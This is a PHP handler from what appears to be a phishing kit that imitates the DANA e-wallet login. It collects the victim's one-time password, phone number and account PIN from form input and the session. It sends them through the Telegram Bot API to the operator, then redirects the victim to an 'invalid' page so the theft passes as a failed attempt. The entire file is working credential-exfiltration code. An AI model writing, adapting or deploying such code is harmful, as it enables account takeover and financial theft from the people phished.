<?php

session_start();
include "./tele.php";

$otp1 = isset($_POST['otp1']) ? $_POST['otp1'] : '';
$otp2 = isset($_POST['otp2']) ? $_POST['otp2'] : '';
$otp3 = isset($_POST['otp3']) ? $_POST['otp3'] : '';
$otp4 = isset($_POST['otp4']) ? $_POST['otp4'] : '';

$otp = $otp1 . $otp2 . $otp3 . $otp4;
$npe        = $_SESSION['npe'];
$email                = $_SESSION['email'];
$password                = $_SESSION['password'];
$_pin                = $_SESSION['acc_pin'];
$tp                = $_SESSION['acc_otp'];

$message = "
├• | 𝗗𝗮𝘁𝗮 𝗔𝗸𝘂𝗻 |
├───────────────────
├• *Nomor Dana* : 0".ltrim($npe, "0")."
├• *PIN AKUN* : ".$_pin."
───────────────────
• OTP : ".$otp."
──────────────────────";

function sendMessage($telegram_id, $message, $token_bot) {
    $url = "https://api.telegram.org/bot" . $token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $token_bot);
header('Location: ../invalid.html');
?>